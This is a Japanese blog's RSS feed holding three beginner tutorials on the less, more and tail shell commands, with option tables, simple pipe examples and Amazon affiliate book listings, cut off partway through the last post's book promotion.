<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>NLP</title><link>https://suzukiiichiro.github.io/</link><description>Recent content on NLP</description><generator>Hugo -- gohugo.io</generator><language>ja-jp</language><lastBuildDate>Sun, 13 Feb 2022 16:35:49 +0900</lastBuildDate><atom:link href="https://suzukiiichiro.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>（6）【less】シェルスクリプトコマンド活用紹介</title><link>https://suzukiiichiro.github.io/posts/2022-02-13-01-less-suzuki/</link><pubDate>Sun, 13 Feb 2022 16:35:49 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-13-01-less-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-13-01-less-suzuki/bash.jpg" alt="Featured image of post （6）【less】シェルスクリプトコマンド活用紹介" />&lt;h2 id="lessコマンド">lessコマンド&lt;/h2>
&lt;ul>
&lt;li>テキストを1画面ずつ表示する&lt;/li>
&lt;li>キー操作のヘルプを表示する&lt;/li>
&lt;li>長い行を折り返さずに表示する&lt;/li>
&lt;li>ファイルの末尾まで表示したらすぐに終了する&lt;/li>
&lt;/ul>
&lt;h2 id="概要">概要&lt;/h2>
&lt;p>「less」コマンドは、テキストファイルを1画面ずつ表示するコマンドです。「less ファイル名」で実行する他、「コマンド | less」のように、別のコマンドの実行結果を1画面ずつ表示する場合にも使われます。&lt;/p>
&lt;p>　［Enter］キーで1行、スペースキーで1画面先に進める他、上下矢印キーによるスクロールも可能です。表示を終了するには［Q］または［q］キーを入力します。&lt;/p>
&lt;p>　同じ用途のコマンドに「more」があります。lessコマンドはmoreコマンドよりも機能が多く、画面内で検索したり、上にスクロールしたりすることが可能です。&lt;/p>
&lt;h2 id="lessコマンドの書式">lessコマンドの書式&lt;/h2>
&lt;p>less [オプション] ファイル名&lt;br>
コマンド | less [オプション]&lt;/p>
&lt;h2 id="lessコマンドの主なオプション">lessコマンドの主なオプション&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>短いオプション&lt;/th>
&lt;th>長いオプション&lt;/th>
&lt;th>意味&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>+行数,-行数&lt;/td>
&lt;td>&lt;/td>
&lt;td>指定した行から表示する&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>+/文字列&lt;/td>
&lt;td>&lt;/td>
&lt;td>指定文字列を検索し、見つけた行から表示する（正規表現によるパターン指定が可能）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-p文字列&lt;/td>
&lt;td>&amp;ndash;pattern=文字列&lt;/td>
&lt;td>指定文字列を検索し、見つけた行から表示する（正規表現によるパターン指定が可能）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-oファイル&lt;/td>
&lt;td>&amp;ndash;log-file=ファイル&lt;/td>
&lt;td>パイプ（｜）などで標準入力から入力した内容を表示する際、指定したファイルにコピーを保存する。既存ファイルを指定した場合は、上書きするか、追加するかを確認するメッセージが表示される&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-Oファイル&lt;/td>
&lt;td>&amp;ndash;LOG-FILE=ファイル&lt;/td>
&lt;td>「-o」と同じだが、既存ファイルを指定した場合は、確認せずに上書きする&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-kファイル名&lt;/td>
&lt;td>&amp;ndash;lesskey-file=ファイル名&lt;/td>
&lt;td>lesskeyファイル（キー定義ファイル、「lesskey」コマンドで生成）を指定する&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-L&lt;/td>
&lt;td>&amp;ndash;no-lessopen&lt;/td>
&lt;td>環境変数LESSOPEN（lessコマンド用のオプションを定義した環境変数）を無視する&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="lessコマンド詳細説明">lessコマンド詳細説明&lt;/h2>
&lt;h3 id="テキストを1画面ずつ表示する">テキストを1画面ずつ表示する&lt;/h3>
&lt;p>　「less ファイル名」で、指定したファイルを1画面ずつ表示します。次の画面へ進みたい場合はスペースキー、1行ずつ進めたい場合は［Enter］キーを押します。上下の矢印キーや、［y］または［e］キー、［j］または［k］キーで上下にスクロールすることも可能です。［q］キーを押すと終了します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat &amp;lt;filename&amp;gt; | less
&lt;/code>&lt;/pre>&lt;h3 id="キー操作のヘルプを表示する">キー操作のヘルプを表示する&lt;/h3>
&lt;p>　lessコマンドで画面を表示中に［h］キーを押すと、キー操作のヘルプが表示されます（画面2）。ヘルプの表示中でもlessコマンドと同様に、上下のスクロールや検索などの操作が可能です。&lt;/p>
&lt;p>［q］キーを押すとヘルプの表示を終了し、元の画面に戻ります&lt;/p>
&lt;h3 id="長い行を折り返さずに表示する">長い行を折り返さずに表示する&lt;/h3>
&lt;p>　lessコマンドでは、画面の横幅より長い行は折り返して表示されます。折り返さずに表示したい場合は、「-S」オプションを使用します。&lt;/p>
&lt;p>　左右の矢印キーまたは、［ESC］キーに続いて［(］および［)］キーを押すと、左右に半画面分スクロールします。横スクロールの幅は「-#」オプションで指定できます。　&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat filename | less -S
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>［q］キーを押すとヘルプの表示を終了し、元の画面に戻ります。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h1 id="書籍の紹介">書籍の紹介&lt;/h1>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="//ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;amp;MarketPlace=JP&amp;amp;ASIN=4774186945&amp;amp;ServiceVersion=20070822&amp;amp;ID=AsinImage&amp;amp;WS=1&amp;amp;Format=_SL250_&amp;amp;tag=nlpqueens-22">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/B00QJINS1A/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=B00QJINS1A&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=36dff1cf8fa7d4852b5a4a3cf874304b" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="//ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;amp;MarketPlace=JP&amp;amp;ASIN=B00QJINS1A&amp;amp;ServiceVersion=20070822&amp;amp;ID=AsinImage&amp;amp;WS=1&amp;amp;Format=_SL250_&amp;amp;tag=nlpqueens-22">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="//ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;amp;MarketPlace=JP&amp;amp;ASIN=4797393106&amp;amp;ServiceVersion=20070822&amp;amp;ID=AsinImage&amp;amp;WS=1&amp;amp;Format=_SL250_&amp;amp;tag=nlpqueens-22">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>（5）【more】シェルスクリプトコマンド活用紹介</title><link>https://suzukiiichiro.github.io/posts/2022-02-13-01-more-suzuki/</link><pubDate>Sun, 13 Feb 2022 16:35:41 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-13-01-more-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-13-01-more-suzuki/bash.jpg" alt="Featured image of post （5）【more】シェルスクリプトコマンド活用紹介" />&lt;h2 id="moreコマンド">moreコマンド&lt;/h2>
&lt;ul>
&lt;li>長いメッセージやテキストファイルを1画面ずつ表示する&lt;/li>
&lt;li>テキストを1画面ずつ止めながら表示する&lt;/li>
&lt;li>実行結果を止めながら表示したいときにはパイプを使う&lt;/li>
&lt;li>確認したい箇所がある場合は「+/オプション」でスキップ&lt;/li>
&lt;li>行番号付きで表示したいときはcatコマンドと組み合わせる&lt;/li>
&lt;li>moreコマンドで使える主なサブコマンド&lt;/li>
&lt;/ul>
&lt;h2 id="moreコマンド概要">moreコマンド概要&lt;/h2>
&lt;p>moreコマンドは、テキストファイルを1画面ずつ表示するページャコマンドです。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ more &amp;lt;ファイル名&amp;gt;
&lt;/code>&lt;/pre>&lt;p>で実行する他、&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat &amp;lt;ファイル名&amp;gt; | more
&lt;/code>&lt;/pre>&lt;p>のように他のコマンドの実行結果を1画面ずつ表示する際によく使われます。&lt;/p>
&lt;p>　また、moreコマンドにサブコマンドがあり、［Enter］キーで1行、［スペース］キーで1画面先に進み、ファイルの末尾まで表示されると終了します。ファイルを表示している途中でも［Q］キーまたは［q］キーで終了できます。&lt;/p>
&lt;h2 id="moreコマンドの書式">moreコマンドの書式&lt;/h2>
&lt;p>more [オプション] filename&lt;br>
cat filename | more [オプション]&lt;/p>
&lt;h2 id="moreコマンドの主なオプション">moreコマンドの主なオプション&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>オプション&lt;/th>
&lt;th>意味&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>+数値&lt;/td>
&lt;td>数値で指定した行から表示する&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>+/文字列&lt;/td>
&lt;td>指定した文字列を検索して、見つけた行の2行上から表示する&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-s&lt;/td>
&lt;td>連続した空行を1行にする&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-l&lt;/td>
&lt;td>改ページを無視する&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-u&lt;/td>
&lt;td>下線の処理を行わない&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-数値&lt;/td>
&lt;td>画面の行数を指定する&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-f&lt;/td>
&lt;td>画面での行数ではなく、データの行数を表示する&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-d&lt;/td>
&lt;td>無効なキーが入力された場合には、ビープ音の代わりに簡単なヘルプを表示する&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="moreコマンド詳細説明">moreコマンド詳細説明&lt;/h2>
&lt;p>「cat」コマンドでテキストファイルの内容を表示したら、思ったよりも長くコマンドを実行した結果がどんどん上に流れてしまって、テキストファイルのの最初の方が読めない！ そんなときに便利なのが「more」コマンドです。&lt;/p>
&lt;p>moreコマンドは、「more ファイル名」で指定したファイルを1画面ずつ止めながら表示します。次の画面へ進みたいときは［スペース］キーを、1行ずつ画面を進めたいときは［Enter］キーを押します。&lt;/p>
&lt;p>ファイルをページャとして読みたい場合&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat &amp;lt;filename&amp;gt; | more
&lt;/code>&lt;/pre>&lt;p>dmsgなどのシステムファイルをページャとして読みたい&lt;/p>
&lt;pre tabindex="0">&lt;code>$ dmsg | more
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>検索を行う場合はページャ画面で「/」記号に続けて検索文字列を入力し、［Enter］キーを押すとその位置までスキップします。nで直前の検索を繰り返します。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>ファイルを表示している途中でも［Q］キーまたは［q］キーで終了できます。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h1 id="書籍の紹介">書籍の紹介&lt;/h1>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="//ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;amp;MarketPlace=JP&amp;amp;ASIN=4774186945&amp;amp;ServiceVersion=20070822&amp;amp;ID=AsinImage&amp;amp;WS=1&amp;amp;Format=_SL250_&amp;amp;tag=nlpqueens-22">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/B00QJINS1A/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=B00QJINS1A&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=36dff1cf8fa7d4852b5a4a3cf874304b" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="//ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;amp;MarketPlace=JP&amp;amp;ASIN=B00QJINS1A&amp;amp;ServiceVersion=20070822&amp;amp;ID=AsinImage&amp;amp;WS=1&amp;amp;Format=_SL250_&amp;amp;tag=nlpqueens-22">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="//ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;amp;MarketPlace=JP&amp;amp;ASIN=4797393106&amp;amp;ServiceVersion=20070822&amp;amp;ID=AsinImage&amp;amp;WS=1&amp;amp;Format=_SL250_&amp;amp;tag=nlpqueens-22">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>（４）【tail】シェルスクリプトコマンド活用紹介</title><link>https://suzukiiichiro.github.io/posts/2022-02-11-01-tail-suzuki/</link><pubDate>Fri, 11 Feb 2022 14:31:57 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-11-01-tail-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-11-01-tail-suzuki/bash.jpg" alt="Featured image of post （４）【tail】シェルスクリプトコマンド活用紹介" />&lt;h2 id="tailコマンド">tailコマンド&lt;/h2>
&lt;p>headコマンドとは逆に、ファイルの末尾だけ表示するのがtailコマンドです。&lt;/p>
&lt;ul>
&lt;li>tailコマンドでファイルの末尾部分だけを表示する&lt;/li>
&lt;li>ログファイルを監視する&lt;/li>
&lt;li>ファイルの特定の範囲の行を取り出す（headとtail）&lt;/li>
&lt;/ul>
&lt;h2 id="概要">概要&lt;/h2>
&lt;p>ログファイルは、基本ファイルの末尾に新たな記録が追加されます。&lt;br>
「more」コマンドや「less」コマンドで表示しようとすると、末尾まで進むのが面倒だし、ファイルが大きい場合は読み込むのにも時間がかかります。&lt;br>
「tail」コマンドは、ファイルの末尾開かないので手軽で処理も高速です。&lt;br>
tailコマンドも、headコマンド同様、「-n」オプションで表示する行数を指定することができます。&lt;br>
また、tailコマンド最大の魅力は リアルタイムに出力を追記する tail -fです。&lt;br>
ログ監視などに多用されるこの具体例も以下に示します。&lt;/p>
&lt;h2 id="tailコマンドの書式">tailコマンドの書式&lt;/h2>
&lt;p>tail [オプション] ファイル名&lt;/p>
&lt;h2 id="tailコマンドの主なオプション">tailコマンドの主なオプション&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:center">短いオプション&lt;/th>
&lt;th>長いオプション&lt;/th>
&lt;th>意味&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:center">-c 数字&lt;/td>
&lt;td>&amp;ndash;bytes 数字&lt;/td>
&lt;td>末尾の指定したバイト数のみ表示する。「-c 5 b」のように単位を付加することも可能（b=512, KB=1000, K=1024, MB=1000&lt;em>1000, M=1024&lt;/em>1024…）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">-n 数字&lt;/td>
&lt;td>&amp;ndash;lines 数字&lt;/td>
&lt;td>末尾の指定した行数のみ表示する&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">-q&lt;/td>
&lt;td>&amp;ndash;quiet, &amp;ndash;silent&lt;/td>
&lt;td>ファイルごとのヘッダ表示を行わない（複数ファイル指定時に使う）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">-v&lt;/td>
&lt;td>&amp;ndash;verbose&lt;/td>
&lt;td>常にファイルごとのヘッダ出力を行う&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">-f&lt;/td>
&lt;td>&amp;ndash;follow&lt;/td>
&lt;td>ファイルを監視して内容が追加されるたびに末尾に表示する（ログ監視などに使用する。［Ctrl］＋［C］キーで終了）&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="tailコマンド詳細説明">tailコマンド詳細説明&lt;/h2>
&lt;h3 id="tailコマンドでファイルの末尾部分だけを表示する">tailコマンドでファイルの末尾部分だけを表示する&lt;/h3>
&lt;p>ファイルの末尾を表示します。tail -n で表示行数を変更できます。&lt;br>
tail -n10 と デフォルトの tail は同じ出力となります。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat filename | tail -n10
&lt;/code>&lt;/pre>&lt;h3 id="ログファイルを監視する">ログファイルを監視する&lt;/h3>
&lt;p>tailコマンドの「-f」オプションを使うと、ログファイルのように、刻々と内容が追加されていくファイル監視ができるようになります。「-f」は、ファイルなどを監視する際、内容が新たに追加されるたびに末尾に表示するオプションです。ログの監視を終了するには、［Ctrl］＋［C］キーを押します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ sudo tail -f /var/log/httpd/error_log
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>tail -f コマンドはとてもよく使います。&lt;/dd>
&lt;dd>tail -f を実行するtailf コマンドもあります。(Oによりますが)&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h3 id="ファイルの特定の範囲の行を取り出すheadとtail">ファイルの特定の範囲の行を取り出す（headとtail）&lt;/h3>
&lt;p>ファイル後ろの200行目のところから、ファイル先頭に向かって100行を取り出すにはどうしたらよいか？&lt;/p>
&lt;pre tabindex="0">&lt;code>cat filename | tail -n200
&lt;/code>&lt;/pre>&lt;p>これだとファイル末尾から200行を出力するにすぎない。&lt;br>
tail コマンドのみに頼ろうとすると難しいようだ。&lt;br>
実は、head コマンドも使えば、「後ろ200行の先頭100行」を取り出せる。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat filename | tail -n200 | head -n 100
&lt;/code>&lt;/pre>&lt;p>コマンドの実行結果の10001行目から10100行目までが欲しい時は以下の通り。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat filename | head -n10100 | tail -n100
&lt;/code>&lt;/pre>&lt;h1 id="書籍の紹介">書籍の紹介&lt;/h1>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="//ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;amp;MarketPlace=JP&amp;amp;ASIN=4774186945&amp;amp;ServiceVersion=20070822&amp;amp;ID=AsinImage&amp;amp;WS=1&amp;amp;Format=_SL250_&amp;amp;tag=nlpqueens-22">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/B00QJINS1A/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=B00QJINS1A&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=36dff1cf8fa7d4852b5a4a3cf874304b" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="//ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;amp;MarketPlace=JP&amp;amp;ASIN=B00QJINS1A&amp;amp;ServiceVersion=20070822&amp;amp;ID=AsinImage&amp;amp;WS=1&amp;amp;Format=_SL250_&amp;amp;tag=nlpqueens-22">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="//ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;amp;MarketPlace=JP&amp;amp;ASIN=4797393106&amp;amp;ServiceVersion=20070822&amp;amp;ID=AsinImage&amp;amp;WS=1&amp;amp;Format=_SL250_&amp;amp;tag=nlpqueens-22">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
